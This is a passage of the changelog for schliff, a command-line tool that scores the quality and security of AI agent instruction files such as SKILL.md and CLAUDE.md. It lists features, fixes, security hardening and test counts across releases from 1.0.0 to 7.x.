  CI badges now share the canonical E-band (35–49) from
  `terminal_art.score_to_grade`; previously each surface drifted.

### Changed

- **E-band grade now emitted in badge/CI output.** Consumers that parse
  a grade field with a closed set of `{S, A, B, C, D, F}` must now accept
  `E` as well. **Breaking for JSON consumers** that did exhaustive grade
  switching; non-breaking for score-based consumers.
- **`install.sh` reads VERSION from `pyproject.toml`** at install time
  instead of carrying a hard-coded literal. Release process simplified
  accordingly in `RELEASING.md`.
- **EXCLUDED_DIRS centralized** in `shared.py`; `doctor` and related
  scanners share one canonical list.
- **Scorer signatures cleaned up**: unused `**kw` parameters and dead
  `ImportError` fallbacks removed from several scoring / pattern modules.
- **`verify` uses `terminal_art.score_to_grade`** instead of a local
  duplicate, keeping grade mapping in one place.

### Added

- **`RELEASING.md` pre-release checklist** documents the full release
  procedure (version bump, CHANGELOG draft, tag, publish, badge cache-bust).
- **Cross-platform CI expansion**: GitHub Actions matrix covers Python
  3.9–3.13 on ubuntu-latest and adds a dedicated `test-macos` job gating
  badge generation / report publishing.
- **~100 new regression tests** covering non-list eval-suite fields, CLI
  error-handling paths, BSD-grep portability of shipped shell scripts,
  prompt-injection sanitization, UTF edge cases, runtime enabled path,
  and `score_edges` error branches.
- **`setuptools` upper bound pinned** in `pyproject.toml` to avoid build
  breakage from future major releases; test files excluded from the wheel.

### Test coverage

- Total: 1017 → 1117 (+100) / 0 skipped / 0 failed
- New files: `test_scoring_type_guards.py`, `test_cli_error_handling.py`,
  `test_install_version.py`; expanded `test_scoring_edges_malformed.py`
  and new `test_evolve_prompt_injection.py` / `test_evolve_sanitize.py`.

## [7.1.1] - 2026-04-18

### Fixed

- **List-marker support in actionable-line patterns**: `_RE_ACTIONABLE_LINES` and three sibling patterns (`_RE_RUN_PATTERN`, `_RE_DIFF_SIGNAL`, `_RE_IMPERATIVE_INSTRUCTION`) previously only matched numbered list prefixes (`1. Run X`) or bare imperatives, silently dropping markdown bullets (`- Run X`, `* Use Y`, `+ Install Z`). A shared `_LIST_MARKER` alternation is now applied to all four. Impact on a real public CLAUDE.md (root file merged into `modelcontextprotocol/servers`): efficiency 57 → 64, composite 59.2 → 61.0.
- **10 new regression and false-positive tests** in `TestListMarkerSupport` covering supported markers, bare-imperative regression, nested indentation, word-boundary guards, and marker-without-verb cases. Full suite: 1017 passed (up from 1007).

## [7.1.0] - 2026-03-27

### Added

- **`schliff report`**: Generate Markdown quality reports with dimension breakdown, shareable via `--gist` (GitHub Gist API)
- **`schliff drift`**: Stale reference scanner — detects paths, scripts, and make targets referenced in instruction files that no longer exist on disk
- **`schliff sync`**: Cross-file instruction consistency analysis — finds contradictions, gaps, and redundancies across all instruction files in a repository
- **`schliff track`**: Score tracking over time with sparkline visualization and regression detection
- **Token budget tracking**: `schliff score --tokens` shows section-by-section token breakdown with format-specific budgets and severity levels (ok/warning/over)
- **Doctor multi-format**: `schliff doctor` now discovers and reports on CLAUDE.md, .cursorrules, AGENTS.md alongside SKILL.md, with drift analysis on all discovered files
- **Web Playground polish**: Demo file allowlist, Content-Security-Policy headers, improved vercel.json routing
- **Leaderboard scaffold**: Static leaderboard site with serverless API at web/leaderboard/ (ephemeral storage for demo phase, external storage TODO)
- 140 new tests (592 → 732 total), 4 audit iterations on core branch, 1 audit iteration each on intelligence and web branches

### Security

- Path traversal prevention in drift detector (normpath + containment check, absolute/parent path rejection)
- Control character and bidirectional override rejection in leaderboard skill_name validation
- Content-Security-Policy headers on playground and leaderboard
- Duplicate CORS header elimination (vercel.json-only, no Python-level ACAO)
- Temp file cleanup on atomic write failure in track module
- Version field length bound (max 50 chars) on leaderboard submissions

### Fixed

- Token budget severity/within_budget contradiction at exactly 100% utilization
- Doctor relpath used process cwd instead of scan_root (wrong paths when invoked from different directory)
- `find_redundancies` O(n²) performance — capped at 150 directives
- `load_history` silently returned empty list for oversized files (now salvages last 100 entries with warning)
- Config value regex captured inline comments as part of value (false conflicts)

## [7.0.0] - 2026-03-26

### Added

- **Multi-format support**: Score CLAUDE.md, .cursorrules, AGENTS.md alongside SKILL.md
  - Auto-detection from filename, `--format` override flag
  - Content normalization (synthetic frontmatter for non-SKILL.md formats)
  - Zero scorer changes — all formats normalized to SKILL.md shape before scoring
- **Security scoring dimension**: 10 regex patterns across 6 categories (injection, exfiltration, dangerous commands, obfuscation, overpermission, missing boundaries)
  - Deductive scoring (100 minus penalties), graduated composite cap
  - False-positive mitigation: code-block exclusion, meta-discourse detection (90% reduction), negation-aware matching
  - Opt-in via `--security` flag
- **`schliff compare`**: Side-by-side quality comparison of two skill files with dimension deltas
- **`schliff suggest`**: Ranked actionable fixes with estimated score impact
- **`schliff score --url`**: Score remote skill files from GitHub URLs (HTTPS-only, host allowlist, SSRF protection)
- **Web Playground**: Browser-based scorer at schliff.dev/play (serverless Python, shareable URLs)
- **GitHub Action**: Published to Marketplace with PR comments, grade output, branch protection support
- 52 new tests (540 → 592 total), 4 rounds × 6 agents security review per feature branch

### Security

- SSRF redirect protection (`_SafeRedirectHandler`)
- YAML injection prevention in content normalization
- Path traversal guard in playground API
- Shell injection prevention in action
- Content-Length malformed header guard
- JSONDecodeError handling on all JSON parse paths

## [6.3.0] - 2026-03-26

### Added

- `schliff diff <path>` command — show score delta vs. previous commit (or any `--ref`)
  - Ref validation (prevents git flag injection), path containment check, size limit guard
  - Human-readable and `--json` output formats
- CLI quick-start epilog — `schliff` without args now shows demo/score/doctor hints
- Case study: ShieldClaw (OpenClaw plugin) — 68.3 [C] → 94.6 [A] in 1 round, cross-ecosystem proof
- 85 new tests: cmd_diff (18), composite weights (33), diff scoring (34)
- README: context bridge explaining Claude Code for non-users
- README: commands table split into CLI (standalone) vs Claude Code (require integration)
- README: "Where Schliff fits" ecosystem diagram moved to Quick Start section

### Fixed

- Scoring: trigger precision/recall reported 100.0 when no predictions existed (now 0.0)
- Scoring: clarity scorer skipped ambiguous pronoun detection on first line (i==0 case)
- Scoring: efficiency scorer returned float instead of int (inconsistent with other dimensions)
- README: self-score rewording removes circular "99.0/100" claim
- README: anti-gaming section honestly frames benchmark as self-designed suite
- README: triggers description corrected from "conflicts between skills" to "eval-suite trigger accuracy"
- README: test count updated to actual 540 unit + 99 integration with links
- Security: `score_diff()` now receives resolved absolute path instead of raw user input
- Docs: stale test counts in ARCHITECTURE.md and CONTRIBUTING.md updated

## [6.2.0] - 2026-03-25

### Added

- `schliff demo` command — score a built-in bad skill to see schliff in action instantly
- `schliff badge <path>` command — generate copy-paste markdown badge for READMEs
- Pre-commit hook support (`.pre-commit-hooks.yaml`) for automatic skill quality gates
- Doctor: `--verbose` flag shows per-skill issues, `references/` extraction recommendation for large skills
- Community case study: @wan-huiyan agent-review-panel (64→85.6, 75% token reduction, A/B validated)
- 24 new tests for demo, badge, ReDoS fix, clarity injection, JSON rounding (455 total)
- Show HN launch draft (`docs/specs/show-hn-draft.md`)

### Fixed

- Security: ReDoS in `_RE_ERROR_BEHAVIOR` — bounded `[\w\s]+` to `\w[\w ]{0,80}`
- Security: OOM-safe eval-suite loading — `stat().st_size` check before `read_text()`
- Security: symlink rejection on `references/` directory and files in `estimate_token_cost`
- Scoring: `no_real_examples` silently suppressed when `code_block_pairs >= 6`
- Scoring: clarity auto-injection with custom weights — custom weights now take full precedence
- CLI: `schliff auto` reference corrected to `/schliff:auto` (Claude Code slash command)
- CLI: JSON dimension scores rounded to 1 decimal (was outputting raw floats like 92.0501...)
- CLI: badge URL encoding with `safe=""` (forward slash was not percent-encoded)
- Pre-commit: `pass_filenames: true` with file filter (was `false`, causing argparse crash)
- Removed unused `score_coherence` from public API exports
- Removed dead `SCRIPT_DIR` assignments in doctor.py and skill_mesh.py
- Fixed stale BUG DOCUMENTED comments in test_edge_cases.py

### Changed

- Quick Start: reordered to demo → doctor → score for better onboarding
- README: GIF uses absolute GitHub raw URL (fixes broken image on PyPI)
- README: Mermaid diagram section includes "view on GitHub" hint for PyPI
- PyPI metadata: added Homepage, Documentation URLs, Environment::Console classifier
- GitHub: topics reduced from 20 to 10, homepage URL set to PyPI

## [6.1.0] - 2026-03-24

### Added

- Description-aware trigger generation in init-skill (Issue #13)
- Precision/recall reporting in trigger scorer
- `schliff verify` command for CI integration (exit 0/1/2, --min-score, --regression)
- Anti-gaming benchmark with 6 synthetic skills (6/6 detected)
- Repetition detection in efficiency scorer (repeated identical lines count as noise)
- Screenshot-ready `schliff score` output with per-dimension bars and status words
- 100+ new tests (init-skill, precision/recall, verify, terminal_art, anti-gaming)
- 10 new eval-suite test cases (tc-8..tc-17) with 66 coherence-covering assertions

### Changed

- SKILL.md compressed by 13% (1676→1455 words) without information loss
- Self-score: 95.7 → 99.0/100 [S] (quality 91→99 via coherence, efficiency 88→92 via compression)

### Fixed

- Init script no longer generates Schliff-specific triggers for non-Schliff skills
- Structural markers (code fences, headers, horizontal rules) excluded from repetition count
- Code block content excluded from repetition counting (prevents false positives on examples)
- `load_last_score` handles corrupted history entries without crashing
- `run_verify` returns exit code 2 on file-not-found and scorer errors
- ANSI reset constant used consistently in terminal_art output
- 10 bugs from 5-agent security audit (shell injection, prompt injection, ReDoS guards)
- Composability handoff pattern restored (was dropped during SKILL.md compression)

## [6.0.0] - 2026-03-24

### Changed

- **Rebrand: SkillForge → Schliff** — "the finishing cut" (German: den letzten Schliff geben)
- All `/skillforge:*` commands renamed to `/schliff:*`
- All internal references, paths, demo files updated

### Added

- **Clarity as default dimension** — 7th dimension always active (5% weight, opt-out via `--no-clarity`)
- **Token cost estimation** — Doctor shows per-skill token cost + fleet total
- **GitHub Action** — `Zandereins/schliff@v6` scores skills in CI, comments on PRs
- **pip CLI** — `schliff score SKILL.md` works without Claude Code
- **Actionable Doctor** — copy-paste commands with full skill paths
- **Trigger confidence cap** — eval suites with <8 triggers capped at score 60
- **Context-aware contradictions** — "run tests" vs "run tests in production" distinguished
- **Anti-gaming headers** — empty sections don't count toward structure score
- **Signal caps** — efficiency can't be gamed with repetitive markers
- **Star badge** — GitHub stars visible in README
- **"What Schliff Fixes" table** — concrete before/after improvements
- **"Quality & Security" section** — trust signals front-loaded with "What This Means"
- **"Next Steps" CTAs** — clear paths forward for visitors
- 3 new unit tests (token estimation, context contradictions)

### Fixed

- Trigger threshold floor prevents false positives on small eval suites
- Missing dimension warnings always shown (except opt-in runtime)
- Clarity false positives on same verb with different context

### Breaking

- `--clarity` flag removed (clarity is now default; use `--no-clarity` to opt out)

## [5.1.1] - 2026-03-22

### Fixed

- Atomic file writes in text-gradient.py (prevents skill corruption on crash)
- `re.error` guard on all user-controlled regex patterns
- Path traversal validation before skill file writes
- `from __future__` placement after docstrings in 3 files
- Unguarded `terminal_art.progress_bar` import with fallback stub
- Broken all-errors guard using zip identity check
- Missing `encoding="utf-8"` on eval-suite JSON reads (4 call sites)
- Unvalidated `diff_ref` parameter in git subprocess calls
- Severity filter bypass on mesh cache hit
- `terminal_art` import before `sys.path` setup in dashboard
- Non-deterministic `hash()` replaced with `hashlib.sha256` in LSH banding
- `progress.py` loaded once instead of 3 times in report generator

## [5.1.0] - 2026-03-22

### Added

- **Honest Scoring** — "Structural Score" label everywhere, replacing misleading "Quality Score"
- **Stemming Tokenizer** — suffix-stripping replaces fixed synonym tables for better keyword matching
- **Beam Search** — top-3 exploration instead of greedy top-1 from iteration 4 onward
- **EMA Plateau Detection** — Exponential Moving Average replaces fixed-window ROI stopping
- **MinHash + LSH** — O(n) mesh analysis instead of O(n^2) for 50+ skills
- **Context-aware Patches** — generates meaningful descriptions instead of TODOs
- **Doctor Command** (`doctor.py`) — scans all installed skills, shows health summary with grades
- **Dimension Guard** — prevents patches that tank a single dimension by >15 points
- **Coherence Check** — instruction-assertion alignment as quality bonus
- **40+ Pre-compiled Regex** — performance optimization across the scorer
- **Public Cache API** — `invalidate_cache()` replaces direct `_file_cache.pop()`
- **Underscore Alias Modules** — `score_skill.py`, `text_gradient.py`, `skill_mesh.py`, `parallel_runner.py` for Python import compatibility

### Fixed

- State truncation bug in auto-improve loop
- EMA indexing off-by-one in plateau detection
- Deterministic hash for MinHash reproducibility

## [5.0.0] - 2026-03-21

### Added — The Self-Driving Engine

- **Auto-Apply** (`text-gradient.py --apply`) — deterministic patches apply themselves without LLM
- **Auto-Improve** (`auto-improve.py`) — autonomous loop driver: score → gradient → apply → keep/revert → repeat
- **Strategy Predictor** (`meta-report.py predict_best_strategy()`) — predicts P(keep) before trying
- **Runtime Scoring** (`score-skill.py --runtime`) — 7th dimension invokes Claude for behavioral validation
- **Auto-Calibration** (`meta-report.py compute_optimal_weights()`) — dimension weights from data
- **Mesh Evolution** (`skill-mesh.py generate_mesh_actions()`) — generates negative boundaries, stubs, scope fixes
- **Incremental Mesh** (`skill-mesh.py --incremental`) — content-hash caching, O(n×changed) not O(n²)
- **Episodic Memory** (`episodic-store.py`) — cross-session TF-IDF recall with auto-consolidation
- **Parallel Branching** (`parallel-runner.py`) — git worktree experiments, 3 strategies at once
- **ROI Stopping** — marginal ROI < 0.2 for 3 windows → auto-stop
- **Gap Buckets** (`progress.py`) — dimension gaps discretized for predictor input
- **Episode Emit** (`progress.py`) — auto-emit learnings to episodic store after decisions
- New subcommands: `/schliff:auto`, `/schliff:mesh-evolve`, `/schliff:predict`, `/schliff:recall`

### Changed

- Dimension weights redistributed: triggers 25%→20%, quality 25%→20%, composability 10%→5%, new runtime 15%
- `compute_composite()` auto-loads `calibrated-weights.json` when available
- Scorer test updated: 7 dimensions (6 core + runtime opt-in)

## [4.1.0] - 2026-03-21

### Fixed

- 3 critical + 4 high security issues from 4-agent code review
- CI stability with `--no-runtime-auto` in self-tests

## [3.1.0] - 2026-03-20

### Fixed

- `--since` flag now correctly scopes all 11 methods in `progress.py`
- Consistent score capping across all scoring functions

### Added

- Cost tracking: real `duration_ms`, `tokens_estimated`, `delta`, computed `status`
- 25 new integration tests (51 total)
- `explain_score_change()` wired into `--diff` output
- Security: path traversal guard, file size limit (1MB), ReDoS protection
- CHANGELOG.md, SECURITY.md, GitHub CI workflow

### Removed

- Dead code: `history/results.tsv`
- Shell expansion risk: replaced `xargs` with `sed` in `run-eval.sh`

## [3.0.0] - 2026-03-20

### Added

- Runtime evaluator — invoke Claude with test prompts
- Diff-aware scoring (`--diff` flag)
- Strategy meta-learning in `progress.py`
- Instruction clarity scorer (`--clarity` flag)
- Eval health classification
- 26-test integration suite + 12-test self-test suite

### Fixed

- 7 critical bugs found by sparring agents
- 3 assertion type mismatches
- 2 crash bugs, clarity false positives

## [2.3.0] - 2026-03-19

### Added

- Bidirectional synonym expansion, plateau guard, interaction effect detection

## [2.0.0] - 2026-03-18

### Added

- TF-IDF trigger scoring, composability analysis, 9-phase protocol
- Discovery mode, parallel experimentation, noisy metric handling

## [1.0.0] - 2026-03-17

### Added

- Initial release — 6-dimension scoring, eval runner, progress tracking

[Unreleased]: https://github.com/Zandereins/schliff/compare/v8.11.1...HEAD
[8.11.1]: https://github.com/Zandereins/schliff/compare/v8.11.0...v8.11.1
[8.11.0]: https://github.com/Zandereins/schliff/compare/v8.10.1...v8.11.0
[8.10.1]: https://github.com/Zandereins/schliff/compare/v8.10.0...v8.10.1
[8.10.0]: https://github.com/Zandereins/schliff/compare/v8.9.0...v8.10.0
[8.9.0]: https://github.com/Zandereins/schliff/compare/v8.8.2...v8.9.0
[8.8.2]: https://github.com/Zandereins/schliff/compare/v8.8.1...v8.8.2
[8.8.1]: https://github.com/Zandereins/schliff/compare/v8.8.0...v8.8.1
[8.8.0]: https://github.com/Zandereins/schliff/compare/v8.7.0...v8.8.0
[8.7.0]: https://github.com/Zandereins/schliff/compare/v8.6.3...v8.7.0
[8.6.3]: https://github.com/Zandereins/schliff/compare/v8.6.2...v8.6.3
[8.6.2]: https://github.com/Zandereins/schliff/compare/v8.6.1...v8.6.2
[8.6.1]: https://github.com/Zandereins/schliff/compare/v8.6.0...v8.6.1
[8.6.0]: https://github.com/Zandereins/schliff/compare/v8.5.0...v8.6.0
[8.5.0]: https://github.com/Zandereins/schliff/compare/v8.4.0...v8.5.0
[8.4.0]: https://github.com/Zandereins/schliff/compare/v8.3.0...v8.4.0
[8.3.0]: https://github.com/Zandereins/schliff/compare/v8.2.0...v8.3.0
[8.2.0]: https://github.com/Zandereins/schliff/compare/v8.1.0...v8.2.0
[8.1.0]: https://github.com/Zandereins/schliff/compare/v8.0.0...v8.1.0
[8.0.0]: https://github.com/Zandereins/schliff/compare/v7.2.0...v8.0.0
[7.2.0]: https://github.com/Zandereins/schliff/compare/v7.1.1...v7.2.0
[7.1.1]: https://github.com/Zandereins/schliff/compare/v7.1.0...v7.1.1
[7.1.0]: https://github.com/Zandereins/schliff/compare/v7.0.0...v7.1.0
[7.0.0]: https://github.com/Zandereins/schliff/compare/v6.3.0...v7.0.0
[6.3.0]: https://github.com/Zandereins/schliff/compare/v6.2.0...v6.3.0
[6.2.0]: https://github.com/Zandereins/schliff/compare/v6.1.0...v6.2.0
[6.1.0]: https://github.com/Zandereins/schliff/compare/v6.0.0...v6.1.0
[6.0.0]: https://github.com/Zandereins/schliff/compare/v5.1.1...v6.0.0
